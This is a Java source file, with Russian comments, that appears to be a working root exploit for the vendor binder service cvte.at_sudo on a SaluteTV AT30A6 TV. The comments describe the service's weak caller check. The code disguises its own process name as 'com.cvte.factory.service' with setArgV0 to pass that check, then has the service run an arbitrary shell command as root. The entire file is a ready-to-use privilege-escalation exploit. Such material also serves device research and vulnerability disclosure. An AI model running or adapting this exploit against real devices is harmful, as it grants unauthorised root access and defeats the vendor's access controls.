import android.os.IBinder;
import android.os.Parcel;
import java.lang.reflect.Method;

/**
 * AtSudo — клиент к вендорному сервису cvte.at_sudo на SaluteTV AT30A6.
 *
 * Сервис (/vendor/bin/at_sudo, запущен от root) в onTransact():
 *   1) берёт uid вызывающего: разрешены 0, 1000 (system) и 2000 (shell);
 *   2) читает /proc/<pid>/cmdline и сверяет первые 24/20 байт с
 *      "com.cvte.factory.service" / "com.cvte.tv.api.impl";
 *   3) для кода 1 читает String16-команду и выполняет её через system() ОТ ROOT,
 *      результат (int) пишет обратно в Parcel.
 *
 * Мы запускаемся как shell (uid 2000), подменяем argv[0] через Process.setArgV0(),
 * после чего проверка имени процесса проходит, и сервис выполняет нашу команду от root.
 *
 * Запуск (см. scripts/root.sh):
 *   CLASSPATH=/data/local/tmp/atsudo.dex app_process /system/bin AtSudo "id"
 */
public class AtSudo {
  private static final String SUDO_SERVICE = "cvte.at_sudo";
  private static final String FAKE_PROCESS = "com.cvte.factory.service"; // ровно 24 символа

  public static void main(String[] args) throws Exception {
    String cmd = args.length > 0 ? args[0] : "id";

    // /proc/self/cmdline = argv[0]; app_process изначально называется "/system/bin/app_process"
    // (24 символа) — новое имя такой же длины помещается в ту же память.
    try {
      Class<?> proc = Class.forName("android.os.Process");
      Method m;
      try {
        m = proc.getMethod("setArgV0", String.class, boolean.class);
        m.invoke(null, FAKE_PROCESS, Boolean.TRUE);
      } catch (NoSuchMethodException e) {
        m = proc.getMethod("setArgV0", String.class);
        m.invoke(null, FAKE_PROCESS);
      }
      Thread.sleep(150); // сервис читает /proc/<pid>/cmdline уже после нашего вызова
    } catch (Throwable t) {
      System.out.println("argv0: " + t);
    }

    Class<?> sm = Class.forName("android.os.ServiceManager");
    IBinder binder = (IBinder) sm.getMethod("getService", String.class).invoke(null, SUDO_SERVICE);
    if (binder == null) {
      System.out.println("SUDO_SVC=null");
      return;
    }
    Parcel data = Parcel.obtain();
    Parcel reply = Parcel.obtain();
    data.writeString(cmd);
    boolean ok = binder.transact(1, data, reply, 0);
    reply.setDataPosition(0);
    int rc = reply.readInt(); // = код возврата system(); 0 — команда выполнена
    System.out.println("TRANSACT=" + ok + " RC=" + rc);
  }
}
